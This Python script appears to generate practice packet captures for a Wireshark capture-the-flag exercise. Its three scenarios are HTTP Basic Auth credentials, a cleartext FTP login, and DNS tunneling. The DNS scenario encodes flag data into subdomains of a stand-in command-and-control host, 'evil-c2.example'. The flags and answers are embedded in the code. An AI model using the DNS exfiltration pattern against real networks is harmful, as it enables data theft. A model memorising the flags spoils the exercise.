"""Generate hand-crafted pcap captures with hidden flags (pure stdlib).

Produces three classic cleartext-protocol scenarios for Wireshark practice:
  1. HTTP Basic Auth credentials in a GET request
  2. FTP USER/PASS session in cleartext
  3. DNS query whose subdomain is base32-encoded exfiltrated data

Every packet is a valid Ethernet/IPv4/(TCP|UDP) frame so Wireshark
dissects it with full protocol detail.
"""
import base64
import os
import struct

OUT = os.environ.get('CAPTURES_DIR', '/captures')

FLAG_HTTP = os.environ.get('FLAG_1', 'FLAG{http_basic_auth_sniffed}')
FLAG_FTP = os.environ.get('FLAG_2', 'FLAG{ftp_cleartext_creds}')
FLAG_DNS = os.environ.get('FLAG_3', 'FLAG{dns_tunnel_exfil}')


def ip_checksum(header: bytes) -> int:
    if len(header) % 2:
        header += b'\0'
    total = sum(struct.unpack('>%dH' % (len(header) // 2), header))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def ip4(src: str, dst: str, proto: int, payload: bytes) -> bytes:
    total_len = 20 + len(payload)
    src_b = bytes(int(x) for x in src.split('.'))
    dst_b = bytes(int(x) for x in dst.split('.'))
    header = struct.pack('>BBHHHBBH4s4s', 0x45, 0, total_len, 0x0001, 0x4000,
                         64, proto, 0, src_b, dst_b)
    csum = ip_checksum(header)
    header = header[:10] + struct.pack('>H', csum) + header[12:]
    return header + payload


def tcp(sport: int, dport: int, seq: int, payload: bytes, flags: int = 0x18) -> bytes:
    # data offset 5 (no options), reserved 0 -> first byte of that halfword is 0x50
    header = struct.pack('>HHIIBBHHH', sport, dport, seq, 1, 0x50, flags, 8192, 0, 0)
    return header + payload


def udp(sport: int, dport: int, payload: bytes) -> bytes:
    return struct.pack('>HHHH', sport, dport, 8 + len(payload), 0) + payload


def eth(payload: bytes) -> bytes:
    return (b'\x02\x00\x00\x00\x00\x02'      # dst mac
            b'\x02\x00\x00\x00\x00\x01'      # src mac
            b'\x08\x00'                      # ethertype IPv4
            + payload)


def dns_query(txid: int, name: str) -> bytes:
    labels = b''.join(bytes([len(part)]) + part.encode() for part in name.split('.'))
    return (struct.pack('>HHHHHH', txid, 0x0100, 1, 0, 0, 0)
            + labels + b'\x00' + struct.pack('>HH', 1, 1))


class PcapWriter:
    def __init__(self) -> None:
        self.buf = struct.pack('<IHHiIII', 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)

    def add(self, ts: float, frame: bytes) -> None:
        self.buf += struct.pack('<IIII', int(ts), int((ts % 1) * 1e6), len(frame), len(frame))
        self.buf += frame

    def write(self, path: str) -> None:
        with open(path, 'wb') as fh:
            fh.write(self.buf)


def build_http() -> None:
    """Capture 1: admin panel access with Basic Auth over HTTP."""
    creds = f'admin:{FLAG_HTTP}'.encode()
    auth = base64.b64encode(creds).decode()
    request = (
        f'GET /admin/console HTTP/1.1\r\n'
        f'Host: intranet.corp.local\r\n'
        f'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n'
        f'Authorization: Basic {auth}\r\n'
        f'Accept: text/html\r\nConnection: keep-alive\r\n\r\n'
    ).encode()
    response = (
        'HTTP/1.1 200 OK\r\n'
        'Server: nginx/1.24\r\n'
        'Content-Type: text/html\r\n\r\n'
        '<html><body>Admin Console</body></html>'
    ).encode()

    pcap = PcapWriter()
    base = 1730000000.0
    # TCP handshake
    pcap.add(base, eth(ip4('192.168.1.50', '192.168.1.10', 6, tcp(51432, 80, 1000, b'', 0x02))))
    pcap.add(base + 0.001, eth(ip4('192.168.1.10', '192.168.1.50', 6, tcp(80, 51432, 5000, b'', 0x12))))
    pcap.add(base + 0.002, eth(ip4('192.168.1.50', '192.168.1.10', 6, tcp(51432, 80, 1001, b'', 0x10))))
    # Request with credentials + response
    pcap.add(base + 0.010, eth(ip4('192.168.1.50', '192.168.1.10', 6, tcp(51432, 80, 1001, request))))
    pcap.add(base + 0.040, eth(ip4('192.168.1.10', '192.168.1.50', 6, tcp(80, 51432, 5001, response))))
    pcap.write(os.path.join(OUT, 'capture-http.pcap'))


def build_ftp() -> None:
    """Capture 2: FTP login with cleartext credentials."""
    pcap = PcapWriter()
    base = 1730003600.0
    client, server = '10.0.0.20', '10.0.0.5'
    seq_c, seq_s = 2000, 9000

    def c(payload: bytes, ts: float) -> None:
        nonlocal seq_c
        pcap.add(ts, eth(ip4(client, server, 6, tcp(42110, 21, seq_c, payload))))
        seq_c += len(payload)

    def s(payload: bytes, ts: float) -> None:
        nonlocal seq_s
        pcap.add(ts, eth(ip4(server, client, 6, tcp(21, 42110, seq_s, payload))))
        seq_s += len(payload)

    s(b'220 FTP Server ready\r\n', base)
    c(b'USER backup_svc\r\n', base + 0.1)
    s(b'331 Password required for backup_svc\r\n', base + 0.2)
    c(f'PASS {FLAG_FTP}\r\n'.encode(), base + 0.3)
    s(b'230 User logged in\r\n', base + 0.4)
    c(b'SYST\r\n', base + 0.5)
    s(b'215 UNIX Type: L8\r\n', base + 0.6)
    c(b'RETR database_backup.sql\r\n', base + 0.7)
    s(b'150 Opening data connection\r\n', base + 0.8)
    pcap.write(os.path.join(OUT, 'capture-ftp.pcap'))


def build_dns() -> None:
    """Capture 3: DNS tunneling — exfiltrated data base32-encoded in a subdomain."""
    encoded = base64.b32encode(FLAG_DNS.encode()).decode().rstrip('=').lower()
    pcap = PcapWriter()
    base = 1730007200.0
    queries = [
        f'session-start.{encoded[:31]}.tunnel.evil-c2.example',
        f'{encoded[31:]}.data.tunnel.evil-c2.example',
        'www.corp-wiki.local',
        'maps.googleapis.com',
        f'{encoded[:20]}.chunk2.tunnel.evil-c2.example',
    ]
    for i, name in enumerate(queries):
        q = dns_query(0x1000 + i, name)
        pcap.add(base + i * 0.9,
                 eth(ip4('192.168.1.77', '8.8.8.8', 17, udp(53333, 53, q))))
        # minimal response (header + question + answer A 1.2.3.4)
        resp = (struct.pack('>HHHHHH', 0x1000 + i, 0x8180, 1, 1, 0, 0)
                + q[12:]
                + b'\xc0\x0c'                                    # pointer to name
                + struct.pack('>HHIH', 1, 1, 60, 4) + bytes([1, 2, 3, 4]))
        pcap.add(base + i * 0.9 + 0.02,
                 eth(ip4('8.8.8.8', '192.168.1.77', 17, udp(53, 53333, resp))))
    pcap.write(os.path.join(OUT, 'capture-dns.pcap'))


def main() -> None:
    os.makedirs(OUT, exist_ok=True)
    build_http()
    build_ftp()
    build_dns()
    for name in ('capture-http.pcap', 'capture-ftp.pcap', 'capture-dns.pcap'):
        size = os.path.getsize(os.path.join(OUT, name))
        print(f'[pcap] {name}: {size} bytes')


if __name__ == '__main__':
    main()
